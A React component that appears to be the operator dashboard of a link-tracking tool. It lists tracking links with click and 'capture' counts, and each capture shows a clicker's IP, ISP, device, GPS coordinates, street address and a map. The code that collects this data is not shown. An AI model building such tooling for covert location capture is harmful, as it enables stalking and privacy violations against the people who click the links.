// src/views/LinksView.jsx
import { useState } from 'react'
import { Search, ChevronDown, ChevronUp, MapPin, Clock } from 'lucide-react'
import { SBadge } from '../components/UI.jsx'
import { P } from '../styles/theme.js'

function DataRow({ label, value }) {
  if (!value) return null
  return (
    <div>
      <div style={{ fontSize: 9, color: P.muted, fontFamily: "'JetBrains Mono',monospace", textTransform: 'uppercase', letterSpacing: 1, marginBottom: 3 }}>{label}</div>
      <div style={{ fontSize: 12, color: P.txt, fontFamily: "'JetBrains Mono',monospace", wordBreak: 'break-all' }}>{value}</div>
    </div>
  )
}

function CaptureCard({ c, i }) {
  return (
    <div style={{ background: P.surf, border: `1px solid ${P.border}`, borderRadius: 10, padding: '14px 16px', marginBottom: 10 }}>

      {/* ── Data grid ── */}
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit,minmax(150px,1fr))', gap: '10px 20px', marginBottom: 10 }}>
        <DataRow label="IP" value={c.ip} />
        <DataRow label="Location" value={[c.city, c.country].filter(Boolean).join(', ')} />
        <DataRow label="Device" value={c.device} />
        <DataRow label="Browser" value={c.browser} />
        <DataRow label="OS" value={c.os} />
        <DataRow label="ISP" value={c.isp} />
        <DataRow label="Timezone" value={c.timezone} />
        <DataRow label="Screen" value={c.screenWidth ? `${c.screenWidth}×${c.screenHeight}` : null} />
      </div>

      {/* ── GPS block ── */}
      {c.lat && (
        <div style={{ borderTop: `1px solid ${P.border}`, paddingTop: 14, marginTop: 4 }}>
          <div style={{ fontSize: 9, color: P.muted, fontFamily: "'JetBrains Mono',monospace", letterSpacing: 1, textTransform: 'uppercase', marginBottom: 8, display: 'flex', alignItems: 'center', gap: 5 }}>
            <MapPin size={10} color={P.cyan} /> GPS Location
          </div>

          {c.address && (
            <div style={{ fontSize: 11, color: P.txt2, fontFamily: "'JetBrains Mono',monospace", marginBottom: 10 }}>{c.address}</div>
          )}

          {/* map embed */}
          <div style={{ borderRadius: 10, overflow: 'hidden', border: `1px solid ${P.border}`, marginBottom: 10, height: 200 }}>
            <iframe
              key={`map-${i}`}
              title={`map-${i}`}
              width="100%"
              height="100%"
              frameBorder="0"
              src={`https://maps.google.com/maps?q=${c.lat},${c.lon}&z=15&output=embed`}
              allowFullScreen
              style={{ display: 'block' }}
            />
          </div>

          <a
            href={`https://www.google.com/maps?q=${c.lat},${c.lon}`}
            target="_blank"
            rel="noreferrer"
            style={{
              display: 'inline-flex', alignItems: 'center', gap: 6,
              padding: '7px 14px', borderRadius: 8, fontSize: 11, fontWeight: 700,
              background: `linear-gradient(135deg,${P.cyan},${P.cyanD})`,
              color: P.bg, textDecoration: 'none', fontFamily: "'DM Sans',sans-serif",
            }}
          >
            <MapPin size={11} /> View on Google Maps
          </a>
        </div>
      )}

      {/* ── Timestamp ── */}
      <div style={{ display: 'flex', alignItems: 'center', gap: 5, marginTop: 10, fontFamily: "'JetBrains Mono',monospace", fontSize: 10, color: P.muted }}>
        <Clock size={10} /> {c.capturedAt}
      </div>
    </div>
  )
}

export default function LinksView({ links, onLoadMore, hasMore, loadingMore }) {
  const [q, setQ] = useState('')
  const [expanded, setExp] = useState(null)

  const rows = links.filter(l =>
    (l.token || '').includes(q) ||
    (l.label || '').toLowerCase().includes(q.toLowerCase())
  )

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
      <div style={{ position: 'relative', maxWidth: 320 }}>
        <Search size={13} color={P.muted} style={{ position: 'absolute', left: 10, top: '50%', transform: 'translateY(-50%)' }} />
        <input value={q} onChange={e => setQ(e.target.value)} placeholder="Search links…" className="ati" style={{ paddingLeft: 32, width: '100%' }} />
      </div>

      {rows.map(l => {
        const isOpen = expanded === l.id
        return (
          <div key={l.id} className="atc" style={{ overflow: 'hidden' }}>

            {/* ── Header row (clickable) ── */}
            <div
              style={{ padding: '14px 18px', display: 'flex', alignItems: 'center', gap: 14, cursor: 'pointer', userSelect: 'none' }}
              onClick={() => setExp(isOpen ? null : l.id)}
            >
              <div style={{ flex: 1 }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 4 }}>
                  <span style={{ fontFamily: "'JetBrains Mono',monospace", fontSize: 12, color: P.cyan }}>/t/{l.token?.slice(0, 10)}…</span>
                  <SBadge status={l.active ? 'active' : 'inactive'} />
                </div>
                <div style={{ fontSize: 13, color: P.txt2 }}>{l.label || 'Tracking Link'}</div>
              </div>

              <div style={{ display: 'flex', gap: 20, flexShrink: 0, alignItems: 'center' }}>
                <div style={{ textAlign: 'center' }}>
                  <div style={{ fontSize: 18, fontFamily: "'Bebas Neue',cursive", color: P.txt }}>{l.clicks || 0}</div>
                  <div style={{ fontSize: 9, color: P.muted, fontFamily: "'JetBrains Mono',monospace" }}>CLICKS</div>
                </div>
                <div style={{ textAlign: 'center' }}>
                  <div style={{ fontSize: 18, fontFamily: "'Bebas Neue',cursive", color: l.captures?.length > 0 ? P.green : P.muted }}>{l.captures?.length || 0}</div>
                  <div style={{ fontSize: 9, color: P.muted, fontFamily: "'JetBrains Mono',monospace" }}>CAPTURES</div>
                </div>
                <div style={{ color: P.muted }}>
                  {isOpen ? <ChevronUp size={15} /> : <ChevronDown size={15} />}
                </div>
              </div>
            </div>

            {/* ── Expanded capture details ── */}
            {isOpen && (
              <div style={{ borderTop: `1px solid ${P.border}`, padding: '14px 18px' }}>
                {l.captures?.length > 0 ? (
                  l.captures.map((c, i) => <CaptureCard key={i} c={c} i={i} />)
                ) : (
                  <div style={{ fontSize: 12, color: P.muted, fontFamily: "'DM Sans',sans-serif", padding: '8px 0' }}>
                    No captures yet for this link.
                  </div>
                )}
              </div>
            )}
          </div>
        )
      })}

      {rows.length === 0 && (
        <div className="atc" style={{ padding: 40, textAlign: 'center', color: P.muted, fontSize: 13, fontFamily: "'DM Sans',sans-serif" }}>No tracking links yet</div>
      )}
      
      {!q && hasMore && (
        <div style={{ padding: '14px', textAlign: 'center' }}>
          <button className="abtn abtn-g" disabled={loadingMore} onClick={onLoadMore}>
            {loadingMore ? 'Loading...' : 'Load More Links'}
          </button>
        </div>
      )}
    </div>
  )
}
